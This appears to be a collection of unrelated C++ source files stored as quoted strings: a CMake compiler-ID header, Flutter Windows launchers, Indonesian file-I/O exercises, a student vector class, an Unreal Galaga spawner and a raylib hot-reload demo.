    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a versio is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"newapps\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main()\n{\n\t//untuk menyimpan data berbentuk string\n\tstring baris;\n\n\t// membuka file dalam mode menulis\n\tofstream outfile;\n\t//menunjuk ke sebuah nama file\n\toutfile.open(\"contohfile.txt\");\n\n\tcout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\t///unlimited loop untuk menulis\n\twhile (true) {\n\t\tcout << \"- \";\n\t\t//mendapatkan setiap karakter dalam satu baris\n\t\tgetline(cin, baris);\n\t\t//loop akan berhenti jika anda memasukkan karakter q\n\t\tif (baris == \"q\") break;\n\t\t//menulis dan memasukkan niai dari 'baris' ke dalam file\n\t\toutfile << baris << endl;\n\t}\n\t// selesai dalam menulis sekarang tutup file nya\n\toutfile.close();\n\n\t//Membuka file dalam mode baca\n\tifstream infile;\n\t//menujuk ke sebuah file\n\tinfile.open(\"contohfile.txt\");\n\n\tcout << endl << \">= Membuka dan membaca file \" << endl;\n\n\t//jika file ada maka\n\tif (infile.is_open())\n\t{\n\t\t// melakukan perulangan setiap baris\n\t\twhile (getline(infile, baris))\n\t\t{\n\t\t\t//dan tampilkan disini\n\t\t\tcout << baris << '\\n';\n\t\t}\n\t\t//tutp file tersebut setelah selesai\n\t\tinfile.close();\n\t}\n\n\t//jika tidak ditemukan file maka akan menampilkan ini\n\telse cout << \"unable to open file\";\n\treturn 0;\n}",
    "#include <fstream>\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\nint main()\n{\n    string baris;\n    string NamaFile;\n\n    cout << \"Masukkan Nama File :\";\n    cin >> NamaFile;\n\n    // membuka file dalam mode menulis\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(NamaFile + \".txt\", ios::out);\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n    // unlimited loop untuk menulis\n    while (true)\n    {\n        cout << \"-\";\n        // mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        // loop akan berhenti jika anda memasukan q\n        if (baris == \"q\") break;\n        // menulis dan memasukan nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n    }\n    // selesai dalam menulis sekarang tutup filenya\n\n    // selesai dalam menulis sekarang tutup filenya\n    outfile.close();\n\n    // membuka file dalam mode membaca\n    ifstream infile;\n    // menunjuk kesebuah file\n    infile.open(NamaFile + \".txt\", ios::in);\n\n    cout << endl << \">= Membuka dan membaca file\" << endl;\n    // jika file ada maka\n    if (infile.is_open())\n        {  \n        // melakukan perulangan setiap baris\n        while (getline(infile, baris))\n        {\n            // dan tampilkan disini\n            cout << baris << '\\n';\n        }\n        //tutup file tersebut setelah selesai\n        infile.close();\n        }\n        else cout << \"unable to open fie\";\n        return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <vector>\n#include <cmath>\n#include <limits.h> //\u0434\u043b\u044f \u0438\u0433\u043d\u043e\u0440\u043e\u0432\n\nclass Vector3D {\nprivate:\n    std::vector<double> coordinates;\n\npublic:\n    Vector3D() {}\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0432\u0435\u043a\u0442\u043e\u0440\u0430\n    void setCoordinates() {\n        double coord;\n        bool flag = true;\n        while (flag) {\n            coordinates.clear();\n            std::cin >> coord;\n            if (std::cin.fail()) {\n                std::cout << \"one of your coordinates is wrong. Pleasr try again\\n\";\n                std::cin.clear(); //\u0441\u0431\u0440\u0430\u0441\u044b\u0432\u0430\u0435\u043c failbit\n                std::cin.ignore(static_cast<std::streamsize>(std::numeric_limits<int>::max()), '\\n'); //\u043e\u0447\u0438\u0449\u0430\u0435\u0442 \u043f\u043e\u0442\u043e\u043a\n                continue;\n            }\n            std::cin.ignore(1);\n            coordinates.push_back(coord);\n\n            std::cin >> coord;\n            if (std::cin.fail()) {\n                std::cout << \"one of your coordinates is wrong. Pleasr try again\\n\";\n                std::cin.clear();\n                std::cin.ignore(static_cast<std::streamsize>(std::numeric_limits<int>::max()), '\\n');\n                continue;\n            }\n            std::cin.ignore(1);\n            coordinates.push_back(coord);\n\n            std::cin >> coord;\n            if (std::cin.fail()) {\n                std::cout << \"one of your coordinates is wrong. Pleasr try again\\n\";\n                std::cin.clear();\n                std::cin.ignore(static_cast<std::streamsize>(std::numeric_limits<int>::max()), '\\n');\n                continue;\n            }\n            coordinates.push_back(coord);\n            flag = false;\n        }\n        std::cin.ignore(static_cast<std::streamsize>(std::numeric_limits<int>::max()), '\\n');\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0432\u0435\u043a\u0442\u043e\u0440\u0430\n    void print() {\n        std::cout << \"(\";\n        for (int i = 0; i < coordinates.size(); ++i) {\n            std::cout << coordinates[i];\n            if (i != coordinates.size() - 1) {\n                std::cout << \", \";\n            }\n        }\n        std::cout << \")\" << std::endl;\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0441\u043b\u043e\u0436\u0435\u043d\u0438\u044f \u0434\u0432\u0443\u0445 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432\n    Vector3D add(Vector3D other) {\n        Vector3D result;\n        for (int i = 0; i < coordinates.size(); ++i) {\n            result.coordinates.push_back(coordinates[i] + other.coordinates[i]);\n        }\n\n        return result;\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0442\u0430\u043d\u0438\u044f \u043e\u0434\u043d\u043e\u0433\u043e \u0432\u0435\u043a\u0442\u043e\u0440\u0430 \u0438\u0437 \u0434\u0440\u0443\u0433\u043e\u0433\u043e\n    Vector3D subtract(Vector3D other) {\n        Vector3D result;\n        for (int i = 0; i < coordinates.size(); ++i) {\n            result.coordinates.push_back(coordinates[i] - other.coordinates[i]);\n        }\n\n        return result;\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0443\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u044f \u0434\u0432\u0443\u0445 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432\n    Vector3D multiply(Vector3D other) {\n        Vector3D result;\n        for (int i = 0; i < coordinates.size(); ++i) {\n            result.coordinates.push_back(coordinates[i] * other.coordinates[i]);\n        }\n\n        return result;\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u0441\u043a\u0430\u043b\u044f\u0440\u043d\u043e\u0433\u043e \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u044f \u0434\u0432\u0443\u0445 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432\n    double ScalarProduct(Vector3D other) {\n        double product = 0.0;\n        for (int i = 0; i < coordinates.size(); ++i) {\n            product += coordinates[i] * other.coordinates[i];\n        }\n\n        return product;\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u0434\u043b\u0438\u043d\u044b \u0432\u0435\u043a\u0442\u043e\u0440\u0430\n    double magnitude() {\n        double sumOfSquares = 0.0;\n        for (double coordinate : coordinates) {\n            sumOfSquares += coordinate * coordinate;\n        }\n\n        return std::sqrt(sumOfSquares);\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u0443\u0433\u043b\u0430 \u043c\u0435\u0436\u0434\u0443 \u0434\u0432\u0443\u043c\u044f \u0432\u0435\u043a\u0442\u043e\u0440\u0430\u043c\u0438 \u0432 \u0433\u0440\u0430\u0434\u0443\u0441\u0430\u0445\n    double angle(Vector3D other) {\n        double dotProd = ScalarProduct(other);\n        double mag1 = magnitude();\n        double mag2 = other.magnitude();\n        int counter = 0;\n\n        for (int i = 0; i < coordinates.size(); ++i) {\n            if (coordinates[i] == other.coordinates[i])\n                counter++;\n        }\n        if (counter == 3) {return 0;}\n\n        double angleRad = std::cos(dotProd / (mag1 * mag2));\n        angleRad = std::acos(angleRad);\n        angleRad = std::acos(angleRad);\n        double angleDeg = angleRad * 180.0 / 3.1415; // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0440\u0430\u0434\u0438\u0430\u043d \u0432 \u0433\u0440\u0430\u0434\u0443\u0441\u044b\n        return angleDeg;\n    }\n\n    void cleaner() {\n        coordinates.clear();\n    }\n};  \n\nint main() {\n    Vector3D vec1, vec2;\n    std::cout << \"This programm was made by 4 year student Kokurin Konstantin from group M70-406C-20\\nThe program was made to calculate the sum, difference, product, scalar product of vectors, as well as calculate the angle between them.\\n\";\n    char choice = 'y';\n    while (choice == 'y' || choice == 'Y') {\n        choice = 0;\n        std::cout << \"Enter coordinates for vector 1:\" << std::endl;\n        vec1.setCoordinates();\n\n        std::cout << \"Enter coordinates for vector 2:\" << std::endl;\n        vec2.setCoordinates();\n\n        std::cout << \"Vector 1: \";\n        vec1.print();\n\n        std::cout << \"Vector 2: \";\n        vec2.print();\n        std::cout << \"\\n=============================================\\n\\n\";\n\n        Vector3D sum = ",
    "// awa\n#include \"FacadeNaves.h\"\n#include \"NaveEnemiga.h\"\n#include \"NaveEnemigaCaza.h\"\n#include \"NaveEnemigaTransporte.h\"\n#include \"NaveEnemigaEspia.h\"\n#include \"NaveEnemigaHacker.h\"\n#include \"NaveEnemigaUwU.h\"\n#include \"NaveEnemigaRalentizadora.h\"\n#include \"NaveEnemigaFactory.h\"\n#include \"NaveEnemigaNODRIZA.h\"\n#include \"Director.h\"\n#include \"BuilderNaveEscudo.h\"\n#include \"NODRIZA.h\"\n#include \"PowerUp.h\"\n#include \"PowerUpVelocidad.h\"\n#include \"Galaga_USFX_LAB02Pawn.h\"\n#include \"HijasNodriza.h\"\n#include \"EscudoNodriza.h\"\n#include \"MotorNaveNodriza.h\"\n\n// Sets default values\nAFacadeNaves::AFacadeNaves()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n}\n\n// Called when the game starts or when spawned\nvoid AFacadeNaves::BeginPlay()\n{\n\tSuper::BeginPlay();\n}\n\n// Called every frame\nvoid AFacadeNaves::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n}\n\n//***********************************************************************************************************************************************************\n\nvoid AFacadeNaves::SPAWN_NAVES_ENEMIGAS()\n{\n    // Define la ubicaci\u00f3n inicial para spawnear las naves enemigas\n\n    FVector ubicacionInicialNaves1 = FVector(1000.0f, -450.0f, 200.0f);\n    FRotator rotacionNave1 = FRotator(0.0f, 180.0f, 0.0f);\n\n    FVector ubicacionInicialNaves2 = FVector(700.0f, -300.0f, 200.0f);\n    FRotator rotacionNave2 = FRotator(0.0f, 180.0f, 0.0f);\n\n    FVector ubicacionInicialNaves3 = FVector(700.0f, -550.0f, 200.0f);\n    FRotator rotacionNave3 = FRotator(0.0f, 180.0f, 0.0f);\n\n    FVector ubicacionInicialNaves4 = FVector(100.0f, 450.0f, 200.0f);\n    FRotator rotacionNave4 = FRotator(0.0f, 180.0f, 0.0f);\n\n    FVector ubicacionInicialNaves5 = FVector(-200.0f, 700.0f, 200.0f);\n    FRotator rotacionNave5 = FRotator(0.0f, 180.0f, 0.0f);\n\n    FVector ubicacionInicialNaves6 = FVector(1000.0f, -700.0f, 200.0f);\n    FRotator rotacionNave6 = FRotator(0.0f, 180.0f, 0.0f);\n\n //***********************************************************************************************************************************************************\n\n      // Obtiene el mundo del juego\n    UWorld* const World = GetWorld();\n    if (World != nullptr)\n    {\n\n        //NODRIZA BUILDER\n        Director = GetWorld()->SpawnActor<ADirector>(ADirector::StaticClass());\n        NaveEscudo = GetWorld()->SpawnActor<ABuilderNaveEscudo>(ABuilderNaveEscudo::StaticClass());\n        Director->SetBuilder(NaveEscudo);\n        Director->ConstruirNaves();\n\n        ANODRIZA* Nodriza = Director->GetNaveNodriza();\n\n        for (int i = 0; i < 4; i++) {\n            FVector ubicacionActual1 = FVector(ubicacionInicialNaves1.X, ubicacionInicialNaves1.Y + 300.0f * (float)i, ubicacionInicialNaves1.Z);\n            ANaveEnemiga* NaveEnemigaHacker = ANaveEnemigaFactory::FabricaNaves(\"Hacker\", World, ubicacionActual1, rotacionNave1);\n            TANavesEnemigas.Add(NaveEnemigaHacker);\n        }\n        FVector ubicacionActual2 = FVector(ubicacionInicialNaves1.X - 300.0f, ubicacionInicialNaves2.Y, ubicacionInicialNaves2.Z);\n        for (int j = 0; j < 3; j++) {\n            ubicacionActual2.Y = ubicacionInicialNaves2.Y + 300.0f * (float)j;\n            ANaveEnemiga* NaveEnemigaTransporteActual = ANaveEnemigaFactory::FabricaNaves(\"Transporte\", World, ubicacionActual2, rotacionNave2);\n            TANavesEnemigas.Add(NaveEnemigaTransporteActual);\n        }\n        FVector ubicacionActual3 = FVector(ubicacionInicialNaves1.X - 600.0f, ubicacionInicialNaves3.Y, ubicacionInicialNaves3.Z);\n        for (int j = 0; j < 5; j++) {\n            ubicacionActual3.Y = ubicacionInicialNaves3.Y + 300.0f * j;\n            ANaveEnemiga* NaveEnemigaRalentizadoraActual = ANaveEnemigaFactory::FabricaNaves(\"Ralentizadora\", World, ubicacionActual3, rotacionNave3);\n            TANavesEnemigas.Add(NaveEnemigaRalentizadoraActual);\n        }\n        FVector ubicacionActual4 = FVector(ubicacionInicialNaves1.X - 900.0f, ubicacionInicialNaves4.Y, ubicacionInicialNaves4.Z);\n        for (int j = 0; j < 4; j++) {\n            ubicacionActual4.Y = ubicacionInicialNaves4.Y - 300.0f * j;\n            ANaveEnemiga* NaveEnemigaEspiaActual = ANaveEnemigaFactory::FabricaNaves(\"Espia\", World, ubicacionActual4, rotacionNave4);\n            TANavesEnemigas.Add(NaveEnemigaEspiaActual);\n        }\n        FVector ubicacionActual5 = FVector(ubicacionInicialNaves1.X - 1200.0f, ubicacionInicialNaves5.Y, ubicacionInicialNaves5.Z);\n        for (int j = 0; j < 6; j++) {\n            ubicacionActual5.Y = ubicacionInicialNaves5.Y - 300.0f * j;\n            ANaveEnemiga* NaveEnemigaCazaActual = ANaveEnemigaFactory::FabricaNaves(\"Caza\", World, ubicacionActual5, rotacionNave5);\n            TANavesEnemigas.Add(NaveEnemigaCazaActual);\n        }\n        FVector ubicacionActual6 = FVector(ubicacionInicialNaves1.X, ubicacionInicialNaves6.Y, ubicacionInicialNaves6.Z);\n        for (int j = 0; j < 2; j++) {\n            ub",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dalel\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"app.h\"\n#include <cstdint>\n#include <cstdlib>\n#include <ctime>\n#include <iostream>\n#include <raylib.h>\n#include <string>\n\n#if 0\n g++ main.cpp -o main ./libapp.so -lraylib -lGL -lm -lpthread -ldl -lrt -lX11\n  ./main\n#endif\n\nstatic const int SRC_WIDTH = 600;\nstatic const int SRC_HEIGHT = 800;\nstatic const char *APP_NAME = \"Sunpp\";\nstatic const char *MSG = \"Hello!\";\nstatic const int FONT_SIZE = 40;\nstatic const int FPS = 60;\n\n// Textures\nstatic const char *SUN_DIR = \"./assets/sun.png\";\n\nstruct Location {\n  uint64_t latitude;\n  uint64_t longitude;\n};\n\n//\nstruct Weather {\n  int temperature;\n  time_t date;\n  Location location;\n  bool rain = false;\n  bool snow = false;\n  bool cloud = false;\n};\n\nenum class Picture {\n  Sun,\n  Cloud,\n  Rain,\n  Snow,\n};\n\nPicture getPicture(Weather weather) {\n  if (weather.snow)\n    return Picture::Snow;\n  if (weather.rain)\n    return Picture::Rain;\n  if (weather.cloud)\n    return Picture::Cloud;\n  return Picture::Sun;\n}\n\nstd::string timeToStr(time_t rawTime) {\n  struct tm *timeInfo = localtime(&rawTime);\n  char buffer[11]; // \"YYYY-MM-DD\" is 10 characters plus null terminator\n  // Format the date\n  strftime(buffer, sizeof(buffer), \"%Y-%m-%d\", timeInfo);\n  return std::string(buffer);\n}\n\nstd::string locationToStr(Location location) {\n  // 51.5072\u00b0 N, 0.1276\u00b0\n  if (location.latitude == 515072 && location.longitude == 1276) {\n    return std::string(\"London\");\n  }\n  return std::string(\"Paris\");\n}\n\nvoid drawBackGround(Picture picture, App app) {\n  Texture2D texture;\n  switch (picture) {\n  case Picture::Sun:\n    texture = app.sun;\n    break;\n  default:\n    texture = app.sun;\n    break;\n  }\n  Vector2 position = {0, 0};\n  Color tint = WHITE;\n\n  // Draw the texture with the calculated scale\n  DrawTextureEx(texture, position, 0.0f, 0.3f, tint);\n}\n\n#include <dlfcn.h>\n// Define the function pointer type for initApp\ntypedef App (*InitAppFunc)();\n\n// Load the shared library dynamically and obtain the address of the initApp\n// function\nInitAppFunc loadLibrary(const char *libName) {\n  // Load the shared library\n  void *libHandle = dlopen(libName, RTLD_LAZY);\n  if (!libHandle) {\n    // Error handling if library loading fails\n    std::cerr << \"Error loading library: \" << dlerror() << std::endl;\n    return nullptr;\n  }\n\n  // Obtain address of the initApp function\n  InitAppFunc initAppFunc = (InitAppFunc)dlsym(libHandle, \"initApp\");\n  if (!initAppFunc) {\n    // Error handling if function address retrieval fails\n    std::cerr << \"Error getting initApp function address: \" << dlerror()\n              << std::endl;\n    // Unload the library to prevent memory leaks\n    dlclose(libHandle);\n    return nullptr;\n  }\n\n  dlclose(libHandle);\n  // Successfully loaded library and obtained function address\n  return initAppFunc;\n}\n\ntypedef void (*Pee)();\nPee loadPee(const char *libName) {\n  // Load the shared library\n  void *libHandle = dlopen(libName, RTLD_LAZY);\n  if (!libHandle) {\n    // Error handling if library loading fails\n    std::cerr << \"Error loading library: \" << dlerror() << std::endl;\n    return nullptr;\n  }\n\n  // Obtain address of the initApp function\n  Pee pee = (Pee)dlsym(libHandle, \"pee\");\n  if (!pee) {\n    // Error handling if function address retrieval fails\n    std::cerr << \"Error getting initApp function address: \" << dlerror()\n              << std::endl;\n    // Unload the library to prevent memory leaks\n    dlclose(libHandle);\n    return nullptr;\n  }\n\n  dlclose(libHandle);\n  // Successfully loaded library and obtained function address\n  return pee;\n}\n\nint main() {\n  // Init app\n  const char *libName = \"./libapp.so\";\n\n  // Load the initial library\n  InitAppFunc initApp = loadLibrary(libName);\n  if (!initApp) {\n    std::cerr << \"Failed to load initial library.\" << std::endl;\n    return 1;\n  }\n\n  App app = initApp();\n\n  // Main game loop\n  while (!WindowShouldClose()) {\n    if (IsKeyPressed(KEY_B)) {\n      // Reload the library and reinitialize the App object\n      Pee pee = loadPee(\"./libtest.so\");\n      if (pee) {\n        pee();\n      } else {\n        std::cerr << \"Failed to reload library.\" << std::endl;\n      }\n    }\n\n    BeginDrawing();\n\n    ClearBackground(RAYWHITE);\n\n    drawBackGround(Picture::Sun, app);\n    DrawText(MSG, SRC_WIDTH / 3 + 10, SRC_HEIGHT / 5, FONT_SIZE, BLACK);\n\n    EndDrawing();\n  }\n\n  // De-Initialization\n  CloseWindow();\n  return 0;\n}\n",
